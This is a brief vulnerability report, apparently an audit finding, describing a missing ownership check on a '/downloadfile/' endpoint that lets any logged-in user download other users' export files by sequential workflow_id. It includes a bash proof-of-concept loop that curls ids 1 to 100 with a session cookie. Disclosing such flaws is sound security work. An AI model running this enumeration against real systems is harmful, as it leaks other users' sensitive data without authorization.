# Sequential workflow_id download enumeration

**Verification: CODE-VERIFIED**

## Description
`/downloadfile/` requires only login (LoginRequiredMixin); `workflow_id` is a sequential integer with no per-user ownership check. Any logged-in user can enumerate and download other users' offline export files.

## Impact
Cross-user row-data leak: online-masked sensitive columns are exposed as plaintext in downloaded offline export files.

## PoC
```bash
for id in $(seq 1 100); do
  curl -o "workflow_$id" "http://<host>/downloadfile/?workflow_id=$id" -H "Cookie: sessionid=<session>"
done
```

## Execution result
```
Code path analysis: /downloadfile/ requires login only; workflow_id
sequential with no ownership validation.
```
